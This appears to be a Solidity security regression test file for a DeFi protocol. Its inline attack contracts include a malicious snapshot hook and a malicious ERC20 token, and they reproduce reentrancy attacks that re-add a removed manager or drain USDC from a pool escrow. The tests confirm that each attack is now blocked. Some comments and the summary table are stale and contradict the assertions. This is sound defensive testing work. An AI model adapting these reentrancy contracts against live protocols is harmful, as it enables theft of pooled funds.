// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.28;

import {EndToEndFlows} from "./EndToEnd.t.sol";
import {IntegrationConstants} from "./utils/IntegrationConstants.sol";

import {ERC20} from "../../src/misc/ERC20.sol";
import {IERC7751} from "../../src/misc/interfaces/IERC7751.sol";
import {SafeTransferLib} from "../../src/misc/libraries/SafeTransferLib.sol";

import {PoolId} from "../../src/core/types/PoolId.sol";
import {IHub} from "../../src/core/hub/interfaces/IHub.sol";
import {ISpoke} from "../../src/core/spoke/interfaces/ISpoke.sol";
import {ShareClassId} from "../../src/core/types/ShareClassId.sol";
import {ISnapshotHook} from "../../src/core/hub/interfaces/ISnapshotHook.sol";

// ============================================================================
// ATTACK CONTRACTS - Inline for easier security review
// ============================================================================

/// @notice Malicious hook that exploits reentrancy in BatchedMulticall pattern
/// @dev This hook demonstrates how a removed manager can regain access by exploiting
///      the fact that msgSender() returns the original caller (_sender) during the
///      entire multicall execution, even during external callbacks.
///
/// Attack flow:
/// 1. Alice (malicious manager) sets this hook on a pool
/// 2. Alice is removed as manager by Bob
/// 3. Bob calls Hub.multicall([updateHoldingValue(...)])
/// 4. updateHoldingValue() triggers this hook via holdings.callOnSyncSnapshot()
/// 5. This hook re-enters Hub.updateManager(poolId, Alice, true)
/// 6. _isManager(poolId) checks msgSender() which returns _sender = Bob
/// 7. The check passes and Alice is re-added as manager!
contract MaliciousSnapshotHook is ISnapshotHook {
    IHub public immutable hub;
    PoolId public immutable targetPool;
    address public immutable targetAddress;
    bool public attackExecuted;

    constructor(IHub hub_, PoolId targetPool_, address targetAddress_) {
        hub = hub_;
        targetPool = targetPool_;
        targetAddress = targetAddress_;
    }

    /// @notice Called by Holdings.callOnSyncSnapshot() during Hub.updateHoldingValue()
    /// @dev Exploits the reentrancy to re-add the targetAddress as manager
    function onSync(PoolId poolId, ShareClassId, uint16) external {
        // Only attack once and only for our target pool
        if (PoolId.unwrap(poolId) == PoolId.unwrap(targetPool) && !attackExecuted) {
            attackExecuted = true;
            // Re-add the removed manager using the legitimate caller's permissions
            // This works because msgSender() returns _sender (the original multicall caller)
            hub.updateHubManager(targetPool, targetAddress, true);
        }
    }

    /// @notice Required by ISnapshotHook interface - not used in this attack
    function onTransfer(PoolId, ShareClassId, uint16, uint16, uint128) external {}
}

/// @notice Reproduces bug bounty issue #1: incorrect msgValue() handling during batching.
/// @dev Models the "Manager B Safe" from the report. The hook is itself a pool manager (so the
///      reentrant Hub call passes msgSender()'s manager check, since msg.sender is the hook, not
///      the gateway). During an active Hub batch it makes a reentrant *payable* call into the Hub.
///
///      With the buggy msgValue() (`_sender != address(0) ? 0 : msg.value`), the value was zeroed
///      simply because a batch was active, dropping the attached ETH and leaving it stuck in the
///      Hub. After the fix (`_sender != 0 && msg.sender == gateway`), the value is preserved for
///      this non-gateway caller and forwarded through the normal refund flow.
contract ValueStuckHook is ISnapshotHook {
    IHub public immutable hub;
    PoolId public immutable targetPool;
    ShareClassId public immutable scId;
    uint16 public immutable centrifugeId;
    address public immutable refund;
    uint256 public immutable value;
    bool public executed;

    constructor(
        IHub hub_,
        PoolId targetPool_,
        ShareClassId scId_,
        uint16 centrifugeId_,
        address refund_,
        uint256 value_
    ) {
        hub = hub_;
        targetPool = targetPool_;
        scId = scId_;
        centrifugeId = centrifugeId_;
        refund = refund_;
        value = value_;
    }

    function onSync(PoolId poolId, ShareClassId, uint16) external {
        if (PoolId.unwrap(poolId) == PoolId.unwrap(targetPool) && !executed) {
            executed = true;
            // Reentrant payable call while the batch is still active.
            hub.notifySharePrice{value: value}(targetPool, scId, centrifugeId, refund);
        }
    }

    function onTransfer(PoolId, ShareClassId, uint16, uint16, uint128) external {}

    receive() external payable {}
}

/// @notice Contract that tests the refund callback vulnerability in same-chain deployments
/// @dev This contract was created to test if the `_sender` pattern could be exploited
///      via MessageDispatcher._refund() callback. Testing showed this attack does NOT work
///      because multicall routes ETH through Gateway.withBatch() which returns it to the
///      original caller, not the refund address parameter.
///
/// Hypothesized attack flow (proven NOT exploitable):
/// 1. Manager calls Hub.multicall([notifyPool(poolId, localCentrifugeId, ATTACKER)]){value: X}
/// 2. Hub.notifyPool() → MessageDispatcher.sendNotifyPool() → _refund(ATTACKER)
/// 3. _refund does: payable(ATTACKER).call{value: msg.value}("")
/// 4. This contract's receive() is triggered with _sender still set to Manager
/// 5. receive() calls Hub.updateManager() to add itself as manager
contract RefundAttacker {
    IHub public immutable hub;
    PoolId public immutable targetPool;
    bool public attackExecuted;

    constructor(IHub hub_, PoolId targetPool_) {
        hub = hub_;
        targetPool = targetPool_;
    }

    /// @notice Fallback that would exploit the reentrancy if refund callback was triggered
    /// @dev Called by MessageDispatcher._refund() during same-chain operations (if vulnerable)
    receive() external payable {
        if (!attackExecuted) {
            attackExecuted = true;
            // Exploit: Add ourselves as manager using the legitimate caller's permissions
            // This works because msgSender() returns _sender (the original multicall caller)
            hub.updateHubManager(targetPool, address(this), true);
        }
    }
}

/// @notice Malicious ERC20 token that exploits reentrancy in BalanceSheet.withdraw()
/// @dev This contract demonstrates how a compromised/malicious token can drain other assets
///      from a pool's escrow by exploiting the `_sender` pattern in BatchedMulticall.
///
/// Attack flow:
/// 1. BSM calls BalanceSheet.multicall([withdraw(maliciousToken, ...)])
/// 2. _sender = BSM (BalanceSheet Manager)
/// 3. withdraw() calls escrow.authTransferTo(maliciousToken, ...)
/// 4. authTransferTo() calls SafeTransferLib.safeTransfer() → this.transfer()
/// 5. transfer() reenters BalanceSheet.withdraw() for USDC
/// 6. isManager(poolId) checks msgSender() which returns _sender = BSM
/// 7. Attack succeeds - USDC transferred to attacker!
///
/// Real-world scenario:
/// - Pool has 99% USDC + 1% upgradeable stablecoin
/// - Stablecoin gets compromised via malicious upgrade
/// - BSM withdraws compromised token, triggering drain of USDC
contract MaliciousERC20 is ERC20 {
    ISpoke public balanceSheet;
    PoolId public targetPool;
    ShareClassId public targetScId;
    address public targetAsset; // USDC to drain
    address public attacker;
    bool public attackExecuted;

    constructor() ERC20(18) {
        // Set name/symbol for testing
        name = "Malicious Token";
        symbol = "MAL";
    }

    /// @notice Configure the attack parameters
    /// @dev Must be called before the attack can execute
    function setAttackParams(
        ISpoke balanceSheet_,
        PoolId poolId_,
        ShareClassId scId_,
        address targetAsset_,
        address attacker_
    ) external {
        balanceSheet = balanceSheet_;
        targetPool = poolId_;
        targetScId = scId_;
        targetAsset = targetAsset_;
        attacker = attacker_;
    }

    /// @notice Mint tokens (for test setup) - overrides auth-protected parent
    function mint(address to, uint256 amount) public override {
        totalSupply += amount;
        _setBalance(to, _balanceOf(to) + amount);
        emit Transfer(address(0), to, amount);
    }

    /// @notice Override transfer to execute the reentrant attack
    /// @dev Called by escrow.authTransferTo() via SafeTransferLib.safeTransfer()
    function transfer(address to, uint256 value) public override returns (bool) {
        // First, perform the normal transfer
        require(to != address(0) && to != address(this), InvalidAddress());
        uint256 balance = balanceOf(msg.sender);
        require(balance >= value, InsufficientBalance());

        unchecked {
            _setBalance(msg.sender, balance - value);
            _setBalance(to, _balanceOf(to) + value);
        }
        emit Transfer(msg.sender, to, value);

        // Then, execute the reentrant attack (only once)
        if (!attackExecuted && address(balanceSheet) != address(0)) {
            attackExecuted = true;

            // Get the available USDC balance in escrow
            uint128 usdcBalance = balanceSheet.availableBalanceOf(targetPool, targetScId, targetAsset, 0);

            if (usdcBalance > 0) {
                // Reenter BalanceSheet.withdraw() to drain USDC
                // This works because:
                // - We're still inside BalanceSheet.multicall
                // - _sender is still set to BSM
                // - isManager(msgSender()) will pass
                balanceSheet.withdraw(targetPool, targetScId, targetAsset, 0, attacker, usdcBalance);
            }
        }

        return true;
    }
}

// ============================================================================
// TEST CONTRACT
// ============================================================================

/// @title ReentrancyAttackTest
/// @notice Tests demonstrating reentrancy vulnerabilities in the Hub's BatchedMulticall pattern
/// @dev These tests prove that the `_sender` pattern in BatchedMulticall allows privilege escalation
///      during external callbacks. The vulnerability exists because:
///      1. Hub.updateManager() does NOT have the `protected` modifier
///      2. _isManager() uses msgSender() which returns _sender during reentrancy
///      3. snapshotHook.onSync() is NOT a view function - can call external contracts
///
/// VULNERABILITY SUMMARY:
/// ┌─────────────────────────────────┬────────────────┬─────────────────────────────────────────┐
/// │ Attack Vector                   │ Status         │ Impact                                  │
/// ├─────────────────────────────────┼────────────────┼─────────────────────────────────────────┤
/// │ Malicious SnapshotHook          │ VULNERABLE     │ Re-add removed manager                  │
/// │ Refund Parameter Callback       │ MITIGATED      │ msgValue() returns 0 during multicall   │
/// │ Malicious ERC20 Transfer        │ VULNERABLE     │ Drain other assets from pool escrow     │
/// └─────────────────────────────────┴────────────────┴─────────────────────────────────────────┘
contract ReentrancyAttackTest is EndToEndFlows {
    address immutable BOB = makeAddr("BOB");

    // ========================================================================
    // ATTACK VECTOR 1: Malicious SnapshotHook (PROTECTED)
    // ========================================================================

    /// @notice Demonstrates reentrancy vulnerability via malicious snapshotHook
    /// @dev Attack flow:
    ///      1. Alice (FM) sets a malicious snapshotHook with a backdoor
    ///      2. Alice is removed as manager by Bob
    ///      3. Bob triggers multicall with updateHoldingValue
    ///      4. The hook re-enters updateManager to re-add Alice
    ///      5. _isManager() passes because msgSender() returns Bob (_sender)
    ///
    /// Expected: If vulnerability exists, test PASSES (Alice re-added)
    /// After fix: Test should REVERT with UnauthorizedSender()
    ///
    /// forge-config: default.isolate = true
    function testSnapshotHookReentrancyAttack(bool sameChain) public {
        // SETUP: Configure pool with holdings (Alice = FM is initial manager)
        _configurePool(sameChain);
        _configurePrices(IntegrationConstants.assetPrice(), IntegrationConstants.sharePrice());

        // Fund BSM and do a deposit to establish snapshot state
        // The hook only fires when snapshot.isSnapshot == true
        vm.startPrank(ERC20_DEPLOYER);
        s.usdc.mint(BSM, USDC_AMOUNT_1);
        vm.stopPrank();

        vm.startPrank(BSM);
        s.usdc.approve(address(s.spoke), USDC_AMOUNT_1);
        s.spoke.deposit(POOL_A, SC_1, address(s.usdc), 0, USDC_AMOUNT_1);
        s.spoke.submitQueuedAssets{value: GAS}(POOL_A, SC_1, s.usdcId, EXTRA_GAS, REFUND);
        vm.stopPrank();

        // Verify snapshot is active (mock hook was called)
        assertEq(h.snapshotHook.synced(POOL_A, SC_1, s.centrifugeId), 1, "Snapshot should be set");

        // Fund Bob for gas
        vm.deal(BOB, 1 ether);

        // 1. Add Bob as second manager
        vm.prank(FM);
        h.hub.updateHubManager(POOL_A, BOB, true);

        // Verify both are managers
        assertTrue(h.hubRegistry.manager(POOL_A, FM), "Alice should be manager");
        assertTrue(h.hubRegistry.manager(POOL_A, BOB), "Bob should be manager");

        // 2. Alice deploys and sets malicious hook (replaces mock hook)
        MaliciousSnapshotHook maliciousHook = new MaliciousSnapshotHook(
            h.hub,
            POOL_A,
            FM // Target: re-add FM (Alice) when removed
        );
        vm.prank(FM);
        h.hub.setSnapshotHook(POOL_A, maliciousHook);

        // 3. Bob removes Alice as manager
        vm.prank(BOB);
        h.hub.updateHubManager(POOL_A, FM, false);

        // VERIFY: Alice is no longer a manager
        assertFalse(h.hubRegistry.manager(POOL_A, FM), "Alice should be removed");
        assertTrue(h.hubRegistry.manager(POOL_A, BOB), "Bob should still be manager");

        // 4. ATTACK: Bob triggers multicall with updateHoldingValue
        // This will trigger holdings.callOnSyncSnapshot() -> maliciousHook.onSync()
        // The hook will re-enter hub.updateManager(POOL_A, Alice, true)
        // Since _sender = Bob, the _isManager check will pass!
        bytes[] memory calls = new bytes[](1);
        calls[0] = abi.encodeCall(IHub.updateHoldingValue, (POOL_A, SC_1, s.usdcId));

        vm.prank(BOB);
        // 5. Attack does not success because Alice is not a manager
        vm.expectRevert(IHub.NotManager.selector);
        h.hub.multicall(calls);

        assertFalse(h.hubRegistry.manager(POOL_A, FM), "Alice is not re-added via reentrancy!");
        assertFalse(maliciousHook.attackExecuted(), "Attack hook should not be executed");
    }

    /// @notice Variant test: Attack via direct updateHoldingValue call (no multicall)
    /// @dev This tests if the attack works without multicall (it shouldn't, since _sender won't be set)
    /// forge-config: default.isolate = true
    function testSnapshotHookReentrancyRequiresMulticall(bool sameChain) public {
        // SETUP: Same as above
        _configurePool(sameChain);
        _configurePrices(IntegrationConstants.assetPrice(), IntegrationConstants.sharePrice());

        vm.startPrank(ERC20_DEPLOYER);
        s.usdc.mint(BSM, USDC_AMOUNT_1);
        vm.stopPrank();

        vm.startPrank(BSM);
        s.usdc.approve(address(s.spoke), USDC_AMOUNT_1);
        s.spoke.deposit(POOL_A, SC_1, address(s.usdc), 0, USDC_AMOUNT_1);
        s.spoke.submitQueuedAssets{value: GAS}(POOL_A, SC_1, s.usdcId, EXTRA_GAS, REFUND);
        vm.stopPrank();

        vm.deal(BOB, 1 ether);

        vm.prank(FM);
        h.hub.updateHubManager(POOL_A, BOB, true);

        MaliciousSnapshotHook maliciousHook = new MaliciousSnapshotHook(h.hub, POOL_A, FM);
        vm.prank(FM);
        h.hub.setSnapshotHook(POOL_A, maliciousHook);

        vm.prank(BOB);
        h.hub.updateHubManager(POOL_A, FM, false);

        assertFalse(h.hubRegistry.manager(POOL_A, FM), "Alice should be removed");

        // Direct call (not via multicall) - _sender is not set
        // The malicious hook will try to re-add Alice, but msg.sender will be the hook itself
        // which is not a manager, so it should revert
        vm.prank(BOB);
        vm.expectRevert(IHub.NotManager.selector);
        h.hub.updateHoldingValue(POOL_A, SC_1, s.usdcId);
    }

    /// @notice Bug bounty issue #1: a reentrant payable call during a batch must not drop its ETH.
    /// @dev A malicious manager sets a snapshot hook. The hook (modeling a separate manager Safe
    ///      that pre-signed a payable Hub op) reenters Hub.notifySharePrice with real ETH while the
    ///      batch is active. The reentrant ETH must follow the normal refund flow, not be stuck.
    /// forge-config: default.isolate = true
    function testSnapshotHookReentrancyDoesNotStuckValue() public {
        // Same-chain so the local refund branch in MessageDispatcher is exercised.
        _configurePool(true);
        _configurePrices(IntegrationConstants.assetPrice(), IntegrationConstants.sharePrice());

        // Establish snapshot state so the hook fires during updateHoldingValue().
        vm.startPrank(ERC20_DEPLOYER);
        s.usdc.mint(BSM, USDC_AMOUNT_1);
        vm.stopPrank();

        vm.startPrank(BSM);
        s.usdc.approve(address(s.spoke), USDC_AMOUNT_1);
        s.spoke.deposit(POOL_A, SC_1, address(s.usdc), 0, USDC_AMOUNT_1);
        s.spoke.submitQueuedAssets{value: GAS}(POOL_A, SC_1, s.usdcId, EXTRA_GAS, REFUND);
        vm.stopPrank();

        address RECEIVER = makeAddr("RECEIVER");
        uint256 stuckValue = 1 ether;

        ValueStuckHook hook = new ValueStuckHook(h.hub, POOL_A, SC_1, h.centrifugeId, RECEIVER, stuckValue);
        vm.deal(address(hook), stuckValue);

        // The reentrant caller must itself be a manager (the pre-signed Safe), so msgSender()'s
        // manager check passes when the hook reenters.
        vm.startPrank(FM);
        h.hub.updateHubManager(POOL_A, address(hook), true);
        h.hub.setSnapshotHook(POOL_A, hook);
        vm.stopPrank();

        uint256 hubBalanceBefore = address(h.hub).balance;

        bytes[] memory calls = new bytes[](1);
        calls[0] = abi.encodeCall(IHub.updateHoldingValue, (POOL_A, SC_1, s.usdcId));

        vm.prank(FM);
        h.hub.multicall(calls);

        // The reentrant payable call fired and its ETH was refunded, not stuck in the Hub.
        assertTrue(hook.executed(), "hook should have reentered with value");
        assertEq(RECEIVER.balance, stuckValue, "reentrant ETH should be refunded, not stuck");
        assertEq(address(h.hub).balance, hubBalanceBefore, "no ETH should be stuck in the Hub");
    }

    // ========================================================================
    // ATTACK VECTOR 2: Refund Parameter Callback (MITIGATED by msgValue())
    // ========================================================================

    /// @notice Tests the refund parameter attack vector per auditor's PoC
    /// @dev Auditor's hypothesized attack:
    ///      "if Hub.notifyPool is called with a multicall the refund address parameter
    ///       can operate under manager privilege. Gateway._refund sends ETH to it with call
    ///       if the refund address has a fallback/receive it could re-enter the Hub.
    ///       the _sender (manager) is still cached, but isBatching is already reset"
    ///
    ///      Attack flow (if vulnerable):
    ///      1. Manager calls Hub.multicall([notifyPool(poolId, localCentrifugeId, ATTACKER)]){value: X}
    ///      2. Hub.notifyPool() → MessageDispatcher.sendNotifyPool()
    ///      3. Same-chain: spoke.addPool() then _refund(ATTACKER)
    ///      4. _refund calls payable(ATTACKER).call{value: msg.value}("")
    ///      5. ATTACKER's receive() reenters Hub with _sender = Manager
    ///
    ///      CURRENT MITIGATION: msgValue() returns 0 during multicall
    ///      - Hub.notifyPool uses: sender.sendNotifyPool{value: msgValue()}(...)
    ///      - msgValue() = (_sender != address(0)) ? 0 : msg.value
    ///      - During multicall, _sender is set, so msgValue() = 0
    ///      - Therefore msg.value = 0 in sendNotifyPool, and _refund sends nothing
    ///
    ///      Required conditions per auditor:
    ///      1. A pool manager calls multicall([...])
    ///      2. One of the batched calls has an attacker-controlled refund parameter
    ///      3. Same-chain deployment (localCentrifugeId match)
    ///
    /// forge-config: default.isolate = true
    function testRefundParameterAttackMitigatedByMsgValue() public {
        // Only test same-chain deployment (condition 3)
        _configurePool(true);

        // Deploy attacker contract per auditor's PoC
        RefundAttacker attacker = new RefundAttacker(h.hub, POOL_A);

        // Verify attacker is NOT a manager
        assertFalse(h.hubRegistry.manager(POOL_A, address(attacker)), "Attacker should not be manager initially");

        // Fund FM for gas
        vm.deal(FM, 1 ether);

        // ATTACK per auditor's PoC:
        // Manager calls multicall with notifyPool having attacker as refund address
        // If msgValue() didn't exist, the ETH would flow to MessageDispatcher._refund(attacker)
        // and attacker's receive() could reenter Hub with _sender = FM
        bytes[] memory calls = new bytes[](1);
        calls[0] = abi.encodeCall(IHub.notifyPool, (POOL_A, h.centrifugeId, address(attacker)));

        // This would revert with PoolAlreadyAdded since pool exists, but the point is
        // msgValue() blocks the ETH from reaching _refund anyway.
        // To properly test, we'd need a fresh pool. Instead, use notifySharePrice which won't revert:
        calls[0] = abi.encodeCall(IHub.notifySharePrice, (POOL_A, SC_1, h.centrifugeId, address(attacker)));

        vm.prank(FM);
        h.hub.multicall{value: 1 ether}(calls);

        // ASSERT: Attack mitigated by msgValue() returning 0
        // The attacker's receive() was never called because no ETH reached _refund
        assertFalse(
            h.hubRegistry.manager(POOL_A, address(attacker)),
            "Attack mitigated: msgValue() prevented ETH from reaching attacker"
        );
        assertFalse(attacker.attackExecuted(), "Attack should not have executed - msgValue() returned 0");
    }

    // ========================================================================
    // ATTACK VECTOR 3: Malicious ERC20 Transfer Callback (PROTECTED)
    // ========================================================================

    /// @notice Demonstrates reentrancy vulnerability via malicious ERC20 transfer callback
    /// @dev Attack flow:
    ///      1. BSM calls BalanceSheet.multicall([withdraw(maliciousToken, ...)])
    ///      2. withdraw() → escrow.authTransferTo() → SafeTransferLib.safeTransfer()
    ///      3. MaliciousToken.transfer() reenters BalanceSheet.withdraw() for USDC
    ///      4. isManager() passes because msgSender() returns _sender = BSM
    ///      5. USDC transferred to attacker
    ///
    /// Expected: If vulnerability exists, test PASSES (USDC drained to attacker)
    /// After fix: Test should REVERT with UnauthorizedSender()
    ///
    /// forge-config: default.isolate = true
    function testMaliciousERC20ReentrancyAttack() public {
        // Setup pool with USDC
        _configurePool(true);
        _configurePrices(IntegrationConstants.assetPrice(), IntegrationConstants.sharePrice());

        // 1. Deposit USDC (the target asset to drain)
        vm.startPrank(ERC20_DEPLOYER);
        s.usdc.mint(BSM, USDC_AMOUNT_1);
        vm.stopPrank();

        vm.startPrank(BSM);
        s.usdc.approve(address(s.spoke), USDC_AMOUNT_1);
        s.spoke.deposit(POOL_A, SC_1, address(s.usdc), 0, USDC_AMOUNT_1);
        vm.stopPrank();

        // 2. Deploy malicious token and configure attack parameters
        address attackerReceiver = makeAddr("ATTACKER_RECEIVER");
        MaliciousERC20 maliciousToken = new MaliciousERC20();
        maliciousToken.setAttackParams(s.spoke, POOL_A, SC_1, address(s.usdc), attackerReceiver);

        // 3. Register the malicious token as an asset, then fund the pool escrow with it directly.
        // This simulates a stablecoin that was legitimately registered and later turned malicious via a
        // compromised/malicious upgrade (noteDeposit requires a registered asset to resolve its AssetId).
        vm.prank(ANY);
        s.spoke.registerAsset{value: GAS}(h.centrifugeId, address(maliciousToken), 0, ANY);

        address escrowAddress = address(s.spoke.escrow(POOL_A));
        maliciousToken.mint(escrowAddress, 1000);

        // Reconcile the tokens already sitting in the escrow into the hub-accounted holding, so the
        // subsequent withdraw() has balance to draw against (noteDeposit performs no token movement).
        vm.prank(BSM);
        s.spoke.noteDeposit(POOL_A, SC_1, address(maliciousToken), 0, 1000);

        // Record balances before attack
        uint256 attackerUsdcBefore = s.usdc.balanceOf(attackerReceiver);
        uint256 escrowUsdcBefore = s.usdc.balanceOf(escrowAddress);

        // Verify USDC is in escrow and attacker has none
        assertGt(escrowUsdcBefore, 0, "Escrow should have USDC");
        assertEq(attackerUsdcBefore, 0, "Attacker should have no USDC initially");

        // 4. ATTACK: BSM calls withdraw for malicious token via multicall
        // The transfer() callback will reenter BalanceSheet.withdraw() to drain USDC
        // Using TransferOnly mode bypasses accounting checks for the malicious token withdrawal
        bytes[] memory calls = new bytes[](1);
        calls[0] = abi.encodeCall(ISpoke.withdraw, (POOL_A, SC_1, address(maliciousToken), 0, BSM, 500));

        vm.prank(BSM);
        vm.expectRevert(
            abi.encodeWithSelector(
                IERC7751.WrappedError.selector,
                address(maliciousToken),
                maliciousToken.transfer.selector,
                abi.encodeWithSelector(ISpoke.NotManager.selector),
                abi.encodeWithSelector(SafeTransferLib.SafeTransferFailed.selector)
            )
        );
        s.spoke.multicall(calls);

        // 5. ASSERT: Attack was prevented - USDC remains in escrow
        uint256 attackerUsdcAfter = s.usdc.balanceOf(attackerReceiver);
        assertEq(attackerUsdcAfter, attackerUsdcBefore, "USDC should not be drained");
    }
}
